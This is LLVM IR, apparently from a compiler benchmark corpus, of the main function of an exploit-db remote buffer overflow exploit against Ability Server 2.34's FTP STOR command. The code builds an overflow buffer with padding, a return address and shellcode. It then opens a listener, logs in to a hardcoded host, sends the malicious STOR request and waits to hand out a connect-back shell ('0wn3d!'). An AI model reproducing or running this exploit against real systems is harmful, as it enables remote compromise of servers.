; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_618.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_618.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@RET = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [81 x i8] c"**Ability Server 2.34 Remote buffer overflow exploit in ftp STOR by NoPh0BiA.**\0A\00", align 1
@.str.1 = private unnamed_addr constant [25 x i8] c"[x] Launching listener.\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"192.168.0.1\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"[x] Sending bad code...\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"USER lar\0D\0APASS lar\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"STOR \00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"[x] Waiting for shell.\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__ zeroinitializer, align 4
@.str.9 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.10 = private unnamed_addr constant [29 x i8] c"[x] Got connection from %s.\0A\00", align 1
@.str.11 = private unnamed_addr constant [13 x i8] c"[x] 0wn3d!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i8* @malloc(i32 1387)
  store i8* %14, i8** %6, align 8
  %15 = call i8* @malloc(i32 968)
  store i8* %15, i8** %7, align 8
  %16 = call i8* @malloc(i32 32)
  store i8* %16, i8** %8, align 8
  %17 = call i8* @malloc(i32 200)
  store i8* %17, i8** %9, align 8
  %18 = load i8*, i8** %7, align 8
  %19 = call i32 @memset(i8* %18, i32 65, i32 968)
  %20 = load i8*, i8** %6, align 8
  %21 = load i8*, i8** %7, align 8
  %22 = call i32 @strcat(i8* %20, i8* %21)
  %23 = load i8*, i8** %8, align 8
  %24 = call i32 @memset(i8* %23, i32 66, i32 32)
  %25 = load i8*, i8** %6, align 8
  %26 = load i8*, i8** @RET, align 8
  %27 = call i32 @strcat(i8* %25, i8* %26)
  %28 = load i8*, i8** %6, align 8
  %29 = load i8*, i8** %8, align 8
  %30 = call i32 @strcat(i8* %28, i8* %29)
  %31 = load i8*, i8** %6, align 8
  %32 = load i8*, i8** @shellcode, align 8
  %33 = call i32 @strcat(i8* %31, i8* %32)
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.1, i64 0, i64 0))
  %36 = call i32 (...) @listener()
  store i32 %36, i32* %11, align 4
  %37 = call i32 @conn(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  store i32 %37, i32* %10, align 4
  %38 = call i32 @sleep(i32 5)
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  %40 = load i32, i32* %10, align 4
  %41 = call i32 @write(i32 %40, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i32 20)
  %42 = call i32 @sleep(i32 3)
  %43 = load i32, i32* %10, align 4
  %44 = call i32 @write(i32 %43, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0), i32 5)
  %45 = load i32, i32* %10, align 4
  %46 = load i8*, i8** %6, align 8
  %47 = load i8*, i8** %6, align 8
  %48 = call i32 @strlen(i8* %47)
  %49 = call i32 @write(i32 %45, i8* %46, i32 %48)
  %50 = load i32, i32* %10, align 4
  %51 = call i32 @write(i32 %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 4)
  %52 = call i32 @sleep(i32 3)
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0))
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %55 = load i32, i32* %10, align 4
  %56 = call i32 @close(i32 %55)
  br label %57

57:                                               ; preds = %2, %61, %76
  store i32 4, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = call i32 @accept(i32 %58, %struct.sockaddr* bitcast (%struct.TYPE_2__* @target to %struct.sockaddr*), i32* %12)
  store i32 %59, i32* %13, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %63

61:                                               ; preds = %57
  %62 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.9, i64 0, i64 0))
  br label %57

63:                                               ; preds = %57
  %64 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @target, i32 0, i32 0), align 4
  %65 = call i8* @inet_ntoa(i32 %64)
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.10, i64 0, i64 0), i8* %65)
  %67 = call i32 (...) @fork()
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %76, label %69

69:                                               ; preds = %63
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.11, i64 0, i64 0))
  %71 = load i32, i32* %13, align 4
  %72 = call i32 @shell(i32 %71)
  %73 = load i32, i32* %13, align 4
  %74 = call i32 @close(i32 %73)
  %75 = call i32 @exit(i32 0) #3
  unreachable

76:                                               ; preds = %63
  %77 = load i32, i32* %13, align 4
  %78 = call i32 @close(i32 %77)
  br label %57
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @listener(...) #1

declare dso_local i32 @conn(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
